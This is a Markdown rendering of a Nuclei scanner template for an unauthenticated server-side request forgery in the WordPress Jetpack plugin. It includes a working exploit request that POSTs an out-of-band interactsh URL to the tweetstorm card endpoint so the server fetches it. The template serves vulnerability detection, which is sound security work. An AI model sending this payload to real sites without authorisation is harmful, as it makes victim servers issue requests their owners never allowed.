# Nuclei Template: Wordpress Jetpack plugin - Server Side Request Forgery
**Template ID:** wp-jetpack-ssrf
**Vulnerability Class:** Resource Injection
**Severity:** Medium
**CWE:** CWE-99
**Source:** Nuclei Template (`wp-jetpack-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
The Jetpack WordPress plugin exposes an endpoint that fetches external URLs provided via the 'urls' parameter to retrieve Twitter (X) card descriptions/metadata. This allows unauthenticated SSRF, enabling attackers to force the server to request attacker-controlled URLs

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/jetpack/readme.txt
POST /wp-json/wpcom/v2/tweetstorm/generate-cards HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Content-Type: application/json

{
"urls": ["http://{{interactsh-url}}"]
}
```

